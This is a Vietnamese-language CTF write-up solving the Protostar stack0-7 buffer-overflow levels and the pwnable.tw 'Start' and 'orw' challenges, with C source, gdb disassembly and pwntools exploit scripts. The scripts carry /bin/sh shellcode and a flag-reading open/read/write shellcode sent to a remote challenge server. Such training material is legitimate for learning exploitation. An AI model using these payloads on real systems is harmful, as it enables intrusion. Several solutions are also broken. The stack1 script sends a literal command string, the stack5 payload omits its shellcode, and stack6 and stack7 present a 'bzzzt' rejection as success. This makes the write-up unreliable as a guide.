# WriteUp
# PROTOSTAR EXPLOIT EXERCISE
## Stack 0 
Hãy cùng mở đầu với stackz3r0 nào các bạn ! Đề bài đã cung cấp cho chúng ta code C nên mọi thứ sẽ dễ hình dung hơn là mã ASM tuy nhiên chúng ta sẽ phân tích cả 2 nhé! 
Từ code C dưới đây, đề bài yêu cầu chúng ta thấy đề bài yêu cầu chúng ta thay đổi biến *modified* để in ra dòng *You changed the 'modified' variable* :
=> Nhìn từ code thì chúng ta sẽ có ý tưởng rằng nhập vào buffer bằng hàn gets và tràn sang modified.
```
/*gcc -o stack0 stackzero.c -fno-stack-protector -g -z execstack */

#include<stdlib.h>
#include<unistd.h>
#include<stdio.h>

int main(int argc, char **argv)
{
	volatile int modified;
	char buffer[64];

	modified = 0;
	gets(buffer);

	if(modified != 0 )
		printf("You changed the 'modified' variable \n");
	else
		printf("Try again?\n");
}
```
Mã ASM mà chúng ta disassemble từ gdb của file stack0 như sau : 
```
   0x0000000000400547 <+0>:	push   rbp
   0x0000000000400548 <+1>:	mov    rbp,rsp
   0x000000000040054b <+4>:	sub    rsp,0x60
   0x000000000040054f <+8>:	mov    DWORD PTR [rbp-0x54],edi
   0x0000000000400552 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000400556 <+15>:	mov    DWORD PTR [rbp-0x4],0x0
   0x000000000040055d <+22>:	lea    rax,[rbp-0x50]
   0x0000000000400561 <+26>:	mov    rdi,rax
   0x0000000000400564 <+29>:	mov    eax,0x0
   0x0000000000400569 <+34>:	call   0x400450 <gets@plt>
   0x000000000040056e <+39>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400571 <+42>:	test   eax,eax
   0x0000000000400573 <+44>:	je     0x400581 <main+58>
   0x0000000000400575 <+46>:	mov    edi,0x400628
   0x000000000040057a <+51>:	call   0x400430 <puts@plt>
   0x000000000040057f <+56>:	jmp    0x40058b <main+68>
   0x0000000000400581 <+58>:	mov    edi,0x40064d
   0x0000000000400586 <+63>:	call   0x400430 <puts@plt>
   0x000000000040058b <+68>:	mov    eax,0x0
   0x0000000000400590 <+73>:	leave  
   0x0000000000400591 <+74>:	ret   
```
Theo lý thuyết của buffer overflow thì chúng ta chỉ cần nhập byte vào cho tràn biến buffer và tràn sang modified là oke :< Vậy thì phải xác định được vị trí và kích thước của buffer và modified.
Dựa vào mã ASM ở trên chúng ta suy ra được :
[rbp-0x50] sẽ là địa chỉ của *buffer*
[rbp-0x4] sẽ là địa chỉ của *modified*
0x50 - 0x4 = 0x4c có nghĩa chỉ cần đè > 0x4c là có thể 

Mình dùng đoạn code sau để exploit bài này!
```
from pwn import *

BIN = "./stack0"
DEBUG = 1

gets = 0x0000000000400588
callback = 0x0000000000400575
def exploit():
  payload = b"A"*0x4c + b"B"
  # _breakpoint = """
  #     b *0x0000000000400588
  # """
  # gdb.attach(io, _breakpoint)
  io.sendline(payload)
  io.recv()
  io.interactive()


io = process(BIN)
# context.log_level='debug'
exploit()
```

```
You changed the 'modified' variable
```
## Stack 1

LevelUp++ ! 
Cùng check code C đề cung cấp cho chúng ta như sau :
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("You have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
Chà chà , bài này về cơ chế cũng tương tự bài z3r0 thôi nhé ! Nhưng mà khác ở điểm phương thức nhập input sẽ khác và biến modified yêu cầu thành 1 giá trị xác định rõ ràng cụ thể là *modified = 0x61626364* và input sẽ nhập bằng argv[1] !
Cũng không có gì là quá khó vì chúng ta đã xác định được vị trí của 2 biến trên.
Có 1 điều cần lưu ý là đối với địa chỉ sẽ được ghi theo little edian, có nghĩa là byte nhỏ nhất sẽ nằm ở đầu tiền và byte lớn nhất lại nằm sau cùng ! Tuy nhiên chúng ta có hàm p64() từ thư viện pwntools sẽ giúp chúng ta phần đó 
p64() là vì chương trình này chúng ta complier nó ở hệ điều hành 64 bit, còn nếu 32 bit thì dùng p32().
```
from pwn import *

BIN = "./stack1"
DEBUG = 1

modified = 0x61626364
payload = b"A"*0x4c 
payload += p64(modified)


io = process(BIN)
io.sendline("./stack1 `python -c 'print(payload)'`")

io.interactive()
```
Và cứ thế chúng ta có được dòng :
```
You have correctly got the variable to the right value
```

## Stack 2

LevelUp++ ! Bây giờ lại sang 1 bài khác, đề bài vẫn cho mình 1 chương trình với code C như sau:


```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
Bài này lại xuất hiện 1 hàm rất lạ *variable = getenv("GREENIE")* , lên gg dạo chơi thử xem thì ta biết được : https://www.tutorialspoint.com/c_standard_library/c_function_getenv.htm
Sau khi phân tích và tìm hiểu thì ta rút ra được kết luận là hàm getenv() đó sẽ gán giá trị của environment variable vào variable trong chương trình. 
Sau đó thì lại gán biến variable vào biến buffer, nguyên lý vẫn là thế chúng ta vẫn dựa vào buffer để tràn sang modified.
Đầu tiên sẽ tạo một environment variable có tên là GREENIE nằm trong cùng đường dẫn với sourcecó gí trị như sau:
```
export GREENIE=`python -c 'print( "A"*68+ "\x0a\x0d\x0a\x0d")
```
Để kiểm tra xem biến GREENIE đã nhận được giá trị mình gán vào hay chưa thì chúng ta có thể dùng câu lệnh sau: 

```
echo $GREENIE
```

Vào sau đó chúng ta chỉ cần chạy ./stack2 thôi !


```
you have correctly modified the variable
```
## Stack 3

LevelUp++!  Lên level này rồi thì độ khó cũng sẽ tăng theo thôi :3 
Level này sẽ giúp chúng ta hình dung về flow hoạt động của chương trình !

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
```
Dọc qua code C thì thấy bài yêu cầu chúng ta nhảy sang hàm *win* và in ra dòng *code flow successfully changed*
Về cơ chế thì chúng ta sẽ thay đổi flow hoạt động của chương trình, thay vì để chương trình nhập buffer rồi in ra dòng *calling ...* rồi kết thúc thì chúng ta phải nhảy đến hàm *win*, điểm lưu ý tiếp theo đó là *volatile int (*fp)()* đây là 1 con trỏ hàm. Có nghĩa là chúng ta sẽ nhảy đến địa chỉ mà con trỏ này trỏ tới!
Có nghĩa là chỉ cần đè lên pointer giá trị là địa chỉ của hàm win là được!
dùng gdb để tìm ra địa chỉ của hàm *win= 0x4005b6*.

Tương tự như câu trên chúng ta sẽ dùng p64() để chuyển địa chỉ về little edian rồi đưa vào payload.
```
from pwn import *

BIN = "./stack3"
DEBUG = 1

win = 0x4005b6

def exploit():

  payload = b"A"*0x48 + p64(win)  
  _breakpoint = """
      b *0x00000000004005ea
  """
  gdb.attach(io, _breakpoint)
  io.sendline(payload)
  io.recv()
  io.interactive()


io = process(BIN)
context.log_level='debug'
exploit()
```

```
code flow successfully changed
```

## Stack 4
LevelUp++!  

Level này mà chúng ta có kiến thức về stack khá ổn thì nó cũng sẽ ezzz thôi! Vẫn là thay đổi flow của chương trình nhưng mà theo 1 cách khác !


```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win() #
{
  printf("flag{u hereeee why u have to find ???}\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```


Như code C thì chúng ta chỉ thấy mỗi hàm gets(buffer), vậy thì nói 1 chút về cái flow của chương trình này nhé, để cho dễ thì chúng ta sẽ phân tích mã ASM :

```
   0x0000000000400577 <+0>:	push   rbp
   0x0000000000400578 <+1>:	mov    rbp,rsp
   0x000000000040057b <+4>:	sub    rsp,0x50
   0x000000000040057f <+8>:	mov    DWORD PTR [rbp-0x44],edi
   0x0000000000400582 <+11>:	mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000400586 <+15>:	lea    rax,[rbp-0x40]
   0x000000000040058a <+19>:	mov    rdi,rax
   0x000000000040058d <+22>:	mov    eax,0x0
   0x0000000000400592 <+27>:	call   0x400450 <gets@plt>
   0x0000000000400597 <+32>:	mov    eax,0x0
   0x000000000040059c <+37>:	leave  
   0x000000000040059d <+38>:	ret    
```

Như chúng ta thấy, sau hàm get thì chúng ta sẽ có lần lượt các hàm có công dụng là trả về 0 cho eax, leave sẽ khôi phục lại stack trước khi thực thi hàm này, cụ thể là trả về giá trị cũ về rbp và rsp sau đó ret sẽ nhảy về địa chỉ trên đỉnh stack!

Điều đó có nghĩa là chúng ta sẽ cần đến 0x40 bytes để đè hết buffer, 0x8 bytes để đè old ebp ( cần 0x8 bytes bởi vì 64bit, 0x4 bytes với 32 bit), tiếp theo là địa chỉ hàm win, hàm mà chúng ta sẽ nhảy về!

Dựa vào đó chúng ta có exploit như sau !

```
from pwn import *

BIN = "./stack4"
DEBUG = 1

win = 0x400566

def exploit():

  payload = b"A"*0x48 + p64(win)
  
  _breakpoint = """
      b *0x0000000000400592
  """
  gdb.attach(io, _breakpoint)
  io.sendline(payload)
  io.recv()
  io.interactive()


io = process(BIN)
context.log_level='debug'
exploit()
```
Flow của chương trình đã bị thay đổi !

```
flag{u hereeee why u have to find ???}
```


## Stack5

(((LevelUp++)++)++) !
Mình phải up như thế vì mình bị dừng ở phần này khá lâu ! Mình không biết tại sao mình lại bị dừng lại ở bài này lâu đến thế ! Chắc tại vì shellcode 😄

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
Code C này rất đơn thuần, chỉ có buffer và gets 🦀 ! Điều đó có nghĩa là chúng ta phải tìm ra 1 hướng mới! 

Như là Shellcode thần chưởng [1- Nhập môn],[2- Luyện Asm]
Các bạn hãy lên mạng search đọc nhé !

Sau cùng sau khi tìm hiểu thì flow hoạt động của shellcode như sau: Bạn cần ghi shellcode vào 1 địa chỉ nào đó sau đó return về đúng địa chỉ của shellcode thì đoạn shellcode đó sẽ được thực thi :vvvv

Nhìn về bài này có nghĩa là phải gọi 1 lệnh trùm ở system đó là *"/bin/sh"* thay vì ngồi code ASM lệnh này thì chúng ta có thể lên [Shellstorm](http://shell-storm.org/shellcode/) để chọn đoạn shellcode tương ứng với hệ điều hành mà mình đang dùng !

từ đó chúng ta có shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" 

Từ đó viết ra 1 file exploit như sau : 

```
from pwn import *

BIN = "./stack5"
DEBUG = 1

buf = 0x7fffffffde10
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

#\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

def exploit():

  payload = b"A"*(0x48-len(shellcode)) + p64(buf)
  
  _breakpoint = """
      b *0x0000000000400522
  """
  gdb.attach(io, _breakpoint)
  io.sendline(payload)
  io.recv()
  io.interactive()


io = process(BIN)
context.log_level='debug'
exploit()
```


Boommmm


## Stack 6
LevelUp++!
Lên tới level này rồi thì có nghĩa là độ khó đã ghê lắm rồi :<  Nên sẽ có cái mới cho các bạn tìm hiểu ở phần code C của chương trình. 😆😆😆😆


```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
Bài này thì lại xuất hiện 1 hàm mới đó là *`__builtin_return_address(0)`* lại dạo chơi trên gg xem chúng ta gặp cái gì đây nó thì ra lại hàm 1 hàm [return address](https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html).  Hàm này đơn giản chỉ là trả về giá trị trở về của chương trình ứng với lớp được truyền vào. 

Trong trường hợp này, hàm này sẽ trả về giá trị trở về của getpath và gán nó vào biến ret . Và bài yêu cầu chúng ta phải gán được *ret = 0xbf000000* điều đó có nghĩa là hàm getpath phải trả về giá trị 0xbf000000
```
   0x0000000000400617 <+0>:	push   rbp
   0x0000000000400618 <+1>:	mov    rbp,rsp
   0x000000000040061b <+4>:	sub    rsp,0x50
   0x000000000040061f <+8>:	mov    edi,0x400744
   0x0000000000400624 <+13>:	mov    eax,0x0
   0x0000000000400629 <+18>:	call   0x4004f0 <printf@plt>
   0x000000000040062e <+23>:	mov    rax,QWORD PTR [rip+0x200a1b]        # 0x601050 <stdout@@GLIBC_2.2.5>
   0x0000000000400635 <+30>:	mov    rdi,rax
   0x0000000000400638 <+33>:	call   0x400520 <fflush@plt>
   0x000000000040063d <+38>:	lea    rax,[rbp-0x50]
   0x0000000000400641 <+42>:	mov    rdi,rax
   0x0000000000400644 <+45>:	mov    eax,0x0
   0x0000000000400649 <+50>:	call   0x400510 <gets@plt>
   0x000000000040064e <+55>:	mov    rax,QWORD PTR [rbp+0x8]
   0x0000000000400652 <+59>:	mov    DWORD PTR [rbp-0x4],eax
   0x0000000000400655 <+62>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400658 <+65>:	and    eax,0xbf000000
   0x000000000040065d <+70>:	cmp    eax,0xbf000000
   0x0000000000400662 <+75>:	jne    0x400682 <getpath+107>
   0x0000000000400664 <+77>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400667 <+80>:	mov    esi,eax
   0x0000000000400669 <+82>:	mov    edi,0x400758
   0x000000000040066e <+87>:	mov    eax,0x0
   0x0000000000400673 <+92>:	call   0x4004f0 <printf@plt>
   0x0000000000400678 <+97>:	mov    edi,0x1
   0x000000000040067d <+102>:	call   0x4004e0 <_exit@plt>
   0x0000000000400682 <+107>:	lea    rax,[rbp-0x50]
   0x0000000000400686 <+111>:	mov    rsi,rax
   0x0000000000400689 <+114>:	mov    edi,0x400764
   0x000000000040068e <+119>:	mov    eax,0x0
   0x0000000000400693 <+124>:	call   0x4004f0 <printf@plt>
   0x0000000000400698 <+129>:	nop
   0x0000000000400699 <+130>:	leave  
   0x000000000040069a <+131>:	ret    
```
Dựa vào code ASM thì chúng ta thấy buffer ở vị trí [rbp-0x50] có nghĩa là chúng ta sẽ dùng 0x50 bytes để đè lên buffer và ret , sau đó là 0x8 bytes để đè lên old rbp và sau đó sẽ là giá trị mà chúng ta nhảy về là ret.

Mình viết một payload như sau:
```
from pwn import* 

BIN = "./stack6"
DEBUG = 1 

ret = 0xbf000000

def exploit():
	payload = b"A"*0x50 + b"B"*0x8 + p64(ret)

	_breakpoint = """
		0x0000000000400649
	"""
	gdb.attach(io,_breakpoint)
	io.sendline(payload)
	io.recv()
	io.interactive()


io = process(BIN)
context.log_level = 'debug'

exploit()
```

```
bzzzt (0xbf000000)
```


## Stack 7

LevelUp++!

Thậc là tuyệt vời ! 😆😆😆😆😆 đây là level cuối cùng trong chuỗi chall này rồi! Nên là chiến thôii


```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
Bài này không khác gì bài stack 6 cho lắm chỉ xuất hiện thêm hàm *strdup(buffer)* , nên là đi search gg lẹ lẹ ! Hàm [strdup](https://www.geeksforgeeks.org/strdup-strdndup-functions-c/) thực ra không ảnh hưởng gì lớn về việc exploit của mình! Nên là các bạn sẽ tự đọc thêm đi nhé bài này không có gì khó khăn, mình sẽ dùng luôn payload của bài stack 6 nhé !

```
from pwn import* 

BIN = "./stack7"
DEBUG = 1 

ret = 0xbf000000

def exploit():
	payload = b"A"*0x50 + b"B"*0x8 + p64(ret)

	_breakpoint = """
		0x0000000000400699
	"""
	gdb.attach(io,_breakpoint)
	io.sendline(payload)
	io.recv()
	io.interactive()


io = process(BIN)
context.log_level = 'debug'

exploit()

```
Done !


# PWNABLE.TW
## Start

Đề bài cung cấp cho chúng ta 1 file chương trình trên Linux, vì vậy để biết thì chúng ta phải xem thử xem nó làm cái gì nào!
.....
Sau khi chạy thì thấy rằng chương trình in ra dòng *Let's start the CTF:* sau đó get chuỗi chúng ta nhập vào bằng cách nào đó, để biết được cấu trúc chương trình thì chúng ta dùng gdb để disassemble chương trình ra và được hàm _start: 
```
   0x08048060 <+0>:	push   esp
   0x08048061 <+1>:	push   0x804809d
   0x08048066 <+6>:	xor    eax,eax
   0x08048068 <+8>:	xor    ebx,ebx
   0x0804806a <+10>:	xor    ecx,ecx
   0x0804806c <+12>:	xor    edx,edx
   0x0804806e <+14>:	push   0x3a465443
   0x08048073 <+19>:	push   0x20656874
   0x08048078 <+24>:	push   0x20747261
   0x0804807d <+29>:	push   0x74732073
   0x08048082 <+34>:	push   0x2774654c
   0x08048087 <+39>:	mov    ecx,esp
   0x08048089 <+41>:	mov    dl,0x14
   0x0804808b <+43>:	mov    bl,0x1
   0x0804808d <+45>:	mov    al,0x4
   0x0804808f <+47>:	int    0x80
   0x08048091 <+49>:	xor    ebx,ebx
   0x08048093 <+51>:	mov    dl,0x3c
   0x08048095 <+53>:	mov    al,0x3
   0x08048097 <+55>:	int    0x80
   0x08048099 <+57>:	add    esp,0x14
   0x0804809c <+60>:	ret    

```
Như chúng ta thấy thì code asm này khá thô, code dùng những phương thức đơn giản nhất đó chính là sys_call, ví dụ khi eax = 1 thì gọi sys_exit, sys_read = 3, sys_write = 4 ,...
Về việc in ra dòng *Let's start the CTF:* thì chương trình chỉ push chuỗi dưới dạng hex vào stack sau đó gọi sys_write để in ra mà thôi! 

Sau đó gọi sys_read để đọc input vào và tăng esp lên 0x14 để ret. Điều đó làm mình có thể suy đoán là stack này sẽ có độ dài là 0x14. 

Vậy thì không có lỗ hổng thông thường nào như gets(), ... được xuất hiện ở đây, điều đó có nghĩa là chúng ta chỉ việc đưa shellcode vào stack và thực hiện shell thôi!
Để thực hiện được việc gọi shellcode quyền năng là "/bin/sh" thì chúng ta search gg có shellcode sau : 
```
   0:   31 c9                   xor    ecx, ecx
   2:   f7 e1                   mul    ecx
   4:   51                      push   ecx
   5:   68 2f 2f 73 68          push   0x68732f2f
   a:   68 2f 62 69 6e          push   0x6e69622f
   f:   89 e3                   mov    ebx, esp
  11:   b0 0b                   mov    al, 0xb
  13:   cd 80                   int    0x80

shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
```
Sau đó yêu cầu tiếp theo là chúng ta phải tìm được esp_addr thì mới có thể add shellcode vào và thực thi được, để tìm được thì chúng ta chú ý câu lệnh *" 0x08048087 <+39>:	mov    ecx,esp"* câu lệnh này có nghĩa là esp sẽ được đưa vào ecx nên từ đấy chúng ta có thể leak được esp sau đó tính toán stack trả về và đưa shellcode vào : 

```
from pwn import *

BIN = "./start"
DEBUG = 1

shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
addr = 0x08048087 

io = process(BIN)
context.log_level = 'debug'
# io = remote("chall.pwnable.tw", 10000)


#_breakpoint = """
#		0x08048099
#	"""
#gdb.attach(io,_breakpoint)
io.recvuntil("CTF:")
payload = b'A' * 0x14 + p32(addr)
io.send(payload)
esp_addr = u32(io.recv(4))
 
print("[+]Esp address = ", hex(esp_addr))
 
payload = b'A' * 0x14 + p32(esp_addr + 0x14) + shellcode
io.sendline(payload)
io.interactive()
```

## orw

Bài này thì đề như là đề mở vậy vì đề bài đã hướng dẫn cả rồi:
```
Read the flag from /home/orw/flag.
Only open read write syscall are allowed to use.
```

Còn khi vào chạy thử thì chương trình in ra chuỗi *"Give my your shellcode:"* không biết phải trêu mình hay không, nhưng mà vẫn nên disassemble cho chắc ăn vậy 😆😆😆

```
0x08048548 <+0>:	lea    ecx,[esp+0x4]
   0x0804854c <+4>:	and    esp,0xfffffff0
   0x0804854f <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048552 <+10>:	push   ebp
   0x08048553 <+11>:	mov    ebp,esp
   0x08048555 <+13>:	push   ecx
   0x08048556 <+14>:	sub    esp,0x4
   0x08048559 <+17>:	call   0x80484cb <orw_seccomp>
   0x0804855e <+22>:	sub    esp,0xc
   0x08048561 <+25>:	push   0x80486a0
   0x08048566 <+30>:	call   0x8048380 <printf@plt>
   0x0804856b <+35>:	add    esp,0x10
   0x0804856e <+38>:	sub    esp,0x4
   0x08048571 <+41>:	push   0xc8
   0x08048576 <+46>:	push   0x804a060
   0x0804857b <+51>:	push   0x0
   0x0804857d <+53>:	call   0x8048370 <read@plt>
   0x08048582 <+58>:	add    esp,0x10
   0x08048585 <+61>:	mov    eax,0x804a060
   0x0804858a <+66>:	call   eax
   0x0804858c <+68>:	mov    eax,0x0
   0x08048591 <+73>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048594 <+76>:	leave  
   0x08048595 <+77>:	lea    esp,[ecx-0x4]
   0x08048598 <+80>:	ret    

```

Bài này đã dùng 1 phiên bản nâng cấp hơn của asm so với bài trước để viết, dùng nhiều hàm hơn như hàm printf@plt,read@plt,... và cả hàm [orw_seccomp](https://man7.org/linux/man-pages/man2/seccomp.2.html) về cơ bản thì orw_seccomp là 1 hàm lọc sys_call, nên là như đề bài cho thì chỉ có sys_open = 5, sys_read = 3, sys_write = 4 là được cho phép!

Với dữ kiện là địa chỉ của file flag và 3 phương thức trên thì bài này chủ yếu sẽ là mình viết ra được cái shellcode để lấy được flag về và in ra! Điều đó có nghĩa flow sẽ là :
```
sys_open(filename="/home/orw/flag")
sys_read()
sys_write()
```

Dựa vào luồng ở trên thì chúng ta phải cố gắng search gg 7749 cách để viết ra được cái shellcode dạng code asm như sau : 
Đầu tiên phải chuyển string sang bytes : 
```
/home/orw/flag = 2f 68 6f 6d  65 2f 6f 72  77 2f 66 6c  61 67
```
Vậy push chuỗi lần lượt là :
```
push 0x6761;
push 0x6c662f77;
push 0x726f2f65;
push 0x6d6f682f;
mov eax,0x5;  sys_open
mov ebx,esp;  push str
int 0x80; 
mov eax,0x3;  sys_read file
mov ebx,0x3;
mov edx,0x30;
int 0x80
mov eax,0x4;  sys_write 
mov ebx,0x1;
mov edx,0x30;
int 0x80
```
Viết được cái shellcode này là ăn chắc được 60% rồi ! 
Sau đó dùng hàm asm() trong pwntool để chuyển sang bytes và đưa vào shellcode rồi viết file exploit thôi 😄😄

```
from pwn import *

filename="push 0x6761; push 0x6c662f77; push 0x726f2f65; push 0x6d6f682f"
sys_open=";mov eax,0x5;mov ebx,esp;int 0x80;"
sys_read="mov eax,0x3;mov ebx,0x3;mov edx,0x30;int 0x80;"
sys_write="mov eax,0x4;mov ebx,0x1;mov edx,0x30;int 0x80;"

shellcode=asm(filename+sys_open+sys_read+sys_write)

payload=shellcode
s=remote('chall.pwnable.tw',10001)
print(s.recv(1024))
s.sendline(payload)

print(s.recv())
s.interactive()

```
Done! :< 😆😆😆 🦈🦈🦈🦈
